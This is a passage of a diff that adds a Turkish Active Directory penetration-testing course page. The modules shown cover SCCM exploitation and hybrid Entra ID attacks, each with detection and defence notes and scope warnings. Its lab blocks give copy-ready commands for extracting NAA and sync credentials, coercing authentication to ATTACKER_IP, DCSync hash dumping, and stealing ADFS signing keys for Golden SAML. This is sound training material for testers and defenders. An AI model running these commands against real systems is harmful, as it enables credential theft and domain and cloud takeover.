+        <div class="body">
+          <div class="callout det"><span class="ct">İz</span> SQL Audit'te <code>sp_configure</code>/<code>xp_cmdshell</code>
+          etkinleştirme ve olağandışı <code>EXECUTE AS</code>. Savunma: xp_cmdshell kapalı, linked server'ları en az
+          yetkiyle ve karşılıklı güven olmadan kur, servis hesaplarını kısıtla, SQL Audit'i izle.</div>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-h"><div class="ic task">🎯</div><h3>Mini görev</h3></div>
+        <div class="body">
+          <ul>
+            <li>Lab'da iki SQL sunucusu arasında linked server kur, zinciri <code>Get-SQLServerLinkCrawl</code> ile keşfet.</li>
+            <li>xp_cmdshell'i etkinleştir, komut çalıştır ve SQL Audit'te izini bul.</li>
+          </ul>
+          <div class="done-row"><label><input type="checkbox" data-done="m17">Bu modülü tamamladım</label>
+            <span class="st">17 / 20</span></div>
+        </div>
+      </div>
+    </section>
+
+    <!-- M18 SCCM -->
+    <section class="mod" id="m18" data-mod>
+      <div class="mod-badge">MODÜL 18 <span class="lv">saldırı · kurumsal</span></div>
+      <h2>SCCM / MECM İstismarı</h2>
+      <p class="sub">NAA credential, PXE ve client-push coercion ile site takeover.</p>
+
+      <div class="step">
+        <div class="step-h"><div class="ic concept">🧠</div><h3>Kavram</h3></div>
+        <div class="body">
+          <p>SCCM (ConfigMgr/MECM) kurumsal ortamlarda yazılım/işletim sistemi dağıtımını yönetir ve geniş bir
+          saldırı yüzeyi sunar: <b>Network Access Account (NAA)</b> credential'ları, <b>PXE</b> boot medyasındaki
+          gömülü kimlikler, Management Point'e <b>NTLM relay</b> ve nihayetinde <b>site takeover</b> ile ağ geneli
+          kod çalıştırma.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-h"><div class="ic why">⚙️</div><h3>Neden çalışır</h3></div>
+        <div class="body">
+          <p>NAA hesapları client'lara dağıtıldığı için istemci tarafında geri çözülebilir; PXE çoğu zaman zayıf/parolasız
+          yapılandırılır; client-push kimlik doğrulaması makine hesabını attacker'a taşır. SCCM altyapısı sık sık Tier-0
+          korumasından yoksundur.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-h"><div class="ic lab">🔬</div><h3>Lab</h3></div>
+        <div class="body">
+          <pre><span class="c"># SCCM altyapısını keşfet</span>
+SharpSCCM.exe local site-info
+nxc smb <span class="p">10.10.0.0/24</span> -u <span class="s">user</span> -p <span class="s">'Parola!'</span> -M sccm
+<span class="c"># NAA credential'larını çek</span>
+SharpSCCM.exe get naa
+<span class="c"># PXE medyasından credential</span>
+python3 pxethief.py 2 <span class="p">10.10.0.60</span>
+<span class="c"># Client-push coercion (ntlmrelayx ile relay et)</span>
+SharpSCCM.exe invoke client-push -t <span class="p">ATTACKER_IP</span><button class="copy">kopyala</button></pre>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-h"><div class="ic out">📤</div><h3>Beklenen çıktı</h3></div>
+        <div class="body">
+          <p>NAA veya makine hesabı credential'ı. Parola tekrarı (reuse) varsa doğrudan başka sistemlere; site
+          takeover başarılıysa yönetilen tüm istemcilere uygulama push edebilecek konuma gelirsin (etkiyi kanıtla,
+          gerçek dağıtım yapma).</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-h"><div class="ic det">🛡️</div><h3>Tespit &amp; savunma</h3></div>
+        <div class="body">
+          <div class="callout det"><span class="ct">İz</span> Anormal client-push kimlik doğrulaması, NAA erişimi,
+          beklenmedik PXE istekleri. Savunma: NAA yerine Enhanced HTTP/token kullan, PXE'ye parola koy, SCCM site
+          sistemlerini Tier-0 kabul et, Management Point'te SMB imzalama/EPA zorla.</div>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-h"><div class="ic task">🎯</div><h3>Mini görev</h3></div>
+        <div class="body">
+          <ul>
+            <li>Lab SCCM'inde NAA yapılandır, <code>SharpSCCM get naa</code> ile çöz.</li>
+            <li>Client-push coercion'ı ntlmrelayx'e relay edip site DB bağlantısını dene (yalnızca lab).</li>
+          </ul>
+          <div class="done-row"><label><input type="checkbox" data-done="m18">Bu modülü tamamladım</label>
+            <span class="st">18 / 20</span></div>
+        </div>
+      </div>
+    </section>
+
+    <!-- M19 HYBRID / ENTRA -->
+    <section class="mod" id="m19" data-mod>
+      <div class="mod-badge">MODÜL 19 <span class="lv">saldırı · hibrit · hassas</span></div>
+      <h2>Hibrit / Entra ID (Azure AD)</h2>
+      <p class="sub">On-prem ↔ bulut köprüsü: AD Connect, PHS, PTA, Seamless SSO, ADFS.</p>
+
+      <div class="step">
+        <div class="step-h"><div class="ic concept">🧠</div><h3>Kavram</h3></div>
+        <div class="body">
+          <p>Çoğu kurum hibrittir: on-prem AD, Entra ID ile <b>AAD Connect</b> sunucusu üzerinden senkron edilir.
+          Bu köprü çift yönlü bir saldırı yoludur. <b>PHS</b> (Password Hash Sync) modunda senkron hesabı (<code>MSOL_</code>)
+          domain üzerinde DCSync yetkilidir; <b>PTA</b>, <b>Seamless SSO</b> ve <b>ADFS</b> ise bulut tarafında güçlü
+          kalıcılık/impersonation imkânı verir. AAD Connect sunucusu fiilen bir <b>Tier-0</b> varlığıdır.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-h"><div class="ic why">⚙️</div><h3>Neden çalışır</h3></div>
+        <div class="body">
+          <p>Senkron altyapısı hem on-prem hem bulut kimliklerine geniş yetkiyle dokunur ama sık sık normal bir üye
+          sunucu gibi korunur. AAD Connect'te yerel admin olmak → senkron credential'ını çözmek → domain ve bulut
+          hâkimiyeti demektir.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-h"><div class="ic lab">🔬</div><h3>Lab</h3></div>
+        <div class="body">
+          <pre><span class="c"># AAD Connect sunucusunda: senkron (MSOL_) credential'ını çöz</span>
+Import-Module AADInternals
+Get-AADIntSyncCredentials
+<span class="c"># MSOL_ hesabı DCSync yetkilidir → tüm domain hash'leri</span>
+impacket-secretsdump <span class="p">bank.local</span>/<span class="s">MSOL_xxxx</span>:<span class="s">'&lt;çözülen&gt;'</span>@<span class="p">DC01</span> -just-dc<button class="copy">kopyala</button></pre>
+          <pre><span class="c"># Seamless SSO: AZUREADSSOACC$ hash'i ile bulut Silver Ticket</span>
+Open-AADIntOffice365Portal -kerberos -domain <span class="p">bank.com</span> -hash <span class="s">&lt;AZUREADSSOACC_hash&gt;</span>
+<span class="c"># ADFS token imzalama anahtarını çal → Golden SAML</span>
+Export-AADIntADFSSigningCertificate<button class="copy">kopyala</button></pre>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-h"><div class="ic out">📤</div><h3>Beklenen çıktı</h3></div>
+        <div class="body">
+          <p>PHS ortamında MSOL_ ile tüm domain hash'leri (DCSync) ve bulut Global Admin yolu. Golden SAML ile
+          istediğin kullanıcı olarak buluta giriş (MFA'yı da atlar). AzureHound ile bulut saldırı yollarını grafiğe dök.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-h"><div class="ic det">🛡️</div><h3>Tespit &amp; savunma</h3></div>
+        <div class="body">
+          <div class="callout det"><span class="ct">İz</span> MSOL_ ile DCSync (4662/DRSUAPI), Entra sign-in logları,
+          olağandışı token kullanımı. Savunma: AAD Connect'i <b>Tier-0</b> olarak koru/segmentle, PHS yerine mümkünse
+          sınırla, <code>AZUREADSSOACC$</code> parolasını periyodik döndür, ADFS anahtarlarını koru, Conditional Access
+          + MFA'yı sağlamlaştır.</div>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-h"><div class="ic task">🎯</div><h3>Mini görev</h3></div>
+        <div class="body">
+          <div class="callout warn"><span class="ct">Kapsam uyarısı</span> Bulut kaynakları (Entra/M365) çoğu zaman
+          <b>ayrı bir yasal kapsamdır</b>; on-prem izni buluta uzanmayabilir. PTASpy ve ADFS anahtar çalma federasyon
+          altyapısına dokunur — açık yazılı izin şart.</div>
+          <ul>
+            <li>Lab hibrit kurulumunda <code>Get-AADIntSyncCredentials</code> ile senkron hesabını çöz.</li>
+            <li>AzureHound topla, BloodHound'da bulut → on-prem yollarını incele.</li>
+          </ul>
+          <div class="done-row"><label><input type="checkbox" data-done="m19">Bu modülü tamamladım</label>
+            <span class="st">19 / 20</span></div>
+        </div>
+      </div>
+    </section>
+
+    <section class="mod" id="final" data-mod>
+      <div class="mod-badge">BİTİŞ</div>
+      <h2>Tebrikler — tam zinciri öğrendin</h2>
+      <p class="sub">Recon'dan forest ele geçirmeye ve hibrit buluta kadar 20 modülü tamamladın. Şimdi pekiştirme zamanı.</p>
+      <div class="body">
+        <div class="callout tip"><span class="ct">Uçtan uca senaryo</span> Şimdi tüm zinciri <b>tek oturumda</b>
+        birleştir: credential'sız başla (M05 sprey) → enum (M01) → kolay hash (M03/04) → BloodHound'da yol
+        bul → ACL/Delegasyon/Shadow (M06-08) veya ADCS (M09) ile yüksel → credential hasat (M11) → DCSync →
+        golden ticket PoC (M12). Bunu <b>süre tutarak</b> tekrarla, her seferinde daha hızlı ve daha sessiz ol.</div>
+
+        <h3 style="margin:18px 0 4px;font-size:17px">Sonraki adımlar</h3>
+        <ul>
+          <li><b>Detection Lab</b> kur, aynı saldırıları tekrarla ve Splunk/Sysmon'da her Event ID'yi kendin bul — mavi takım gözü seni banka testinde ayakta tutar.</li>
+          <li><b>Rapor yazma pratiği:</b> her modülün mini görev notlarını birleştirip örnek bir bulgu raporu yaz (özet, etki, kanıt, düzeltme önerisi).</li>
+          <li><b>Sertifika hedefi:</b> CRTP → CRTE (kurumsal/tiering) → CRTO (OPSEC). Bu müfredat üçünün de temelini kapsar.</li>
+          <li><b>Referans dosyanı</b> (<code>ad-pentest-command-center.html</code>) sahada, bu akademiyi öğrenirken yan yana kullan.</li>
+        </ul>
+
+        <div class="callout warn"><span class="ct">Banka engagement hatırlatması</span> Scope/RoE her şeyden
+        önce. Coercion, DCSync, LSASS, golden ticket gibi yüksek etkili/gürültülü teknikleri yazılı izin
+        olmadan kullanma. Her AD değişikliğini not al ve geri al. Sessiz yolları (ADCS, Shadow Credentials)
+        tercih et. Şüphede kalırsan — yapma, sor.</div>
+
+        <div class="done-row"><label><input type="checkbox" data-done="final">Tüm akademiyi tamamladım 🎓</label>
+          <span class="st">20 / 20</span></div>
+      </div>
+    </section>
+
+  </main>
+</div>
+
+<script>
+(function(){
+  var links=[].slice.call(document.querySelectorAll('.navlink'));
+  var mods=[].slice.call(document.querySelectorAll('[data-mod]'));
+  var map={}; links.forEach(function(l){map[l.getAttribute('href').slice(1)]=l;});
+  var crumb=document.getElementById('crumb');
+  var obs=new IntersectionObserver(function(es){
+    es.forEach(function(en){ if(en.isIntersecting){
+      links.forEach(function(l){l.classList.remove('active');});
+      var t=map[en.target.id]; if(t){t.classList.add('active');
+        var h=en.target.querySelector('h2'); if(h) crumb.textContent=h.textContent;}
+    }});
+  },{rootMargin:'-30% 0px -60% 0px'});
+  mods.forEach(function(m){obs.observe(m);});
+
+  // copy
+  document.addEventListener('click', function(e){
+    var b=e.target.closest('.copy'); if(!b) return;
+    var pre=b.closest('pre'), t=pre.cloneNode(true), x=t.querySelector('.copy'); if(x)x.remove();
+    navigator.clipboard.writeText(t.textContent.trim()).then(function(){
+      var o=b.textContent; b.textContent='kopyalandı ✓'; setTimeout(function(){b.textContent=o;},1200);
+    }).catch(function(){});
+  });
+
+  // progress + persistence
+  var boxes=[].slice.call(document.querySelectorAll('[data-done]'));
+  var ptxt=document.getElementById('ptxt'), pbar=document.getElementById('pbar');
+  function load(){ try{return JSON.parse(localStorage.getItem('adacad')||'{}');}catch(e){return {};} }
+  function save(s){ try{localStorage.setItem('adacad',JSON.stringify(s));}catch(e){} }
+  var state=load();
+  function refresh(){
+    var n=0; boxes.forEach(function(b){ if(state[b.getAttribute('data-done')]){b.checked=true;n++;} });
+    ptxt.textContent=n+' / '+boxes.length;
+    pbar.style.width=(boxes.length? (n/boxes.length*100):0)+'%';
+  }
+  boxes.forEach(function(b){ b.addEventListener('change',function(){
+    state[b.getAttribute('data-done')]=b.checked; save(state); refresh();
+  });});
+  refresh();
+
+  // theme
+  var tb=document.getElementById('theme');
+  tb.addEventListener('click',function(){
+    var cur=document.documentElement.getAttribute('data-theme');
+    var next=cur==='dark'?'light':cur==='light'?'dark':(matchMedia('(prefers-color-scheme: dark)').matches?'light':'dark');
+    document.documentElement.setAttribute('data-theme',next);
+    try{localStorage.setItem('adactheme',next);}catch(e){}
+  });
+  try{var s=localStorage.getItem('adactheme'); if(s)document.documentElement.setAttribute('data-theme',s);}catch(e){}
+})();
+</script>
+</body>
+</html>
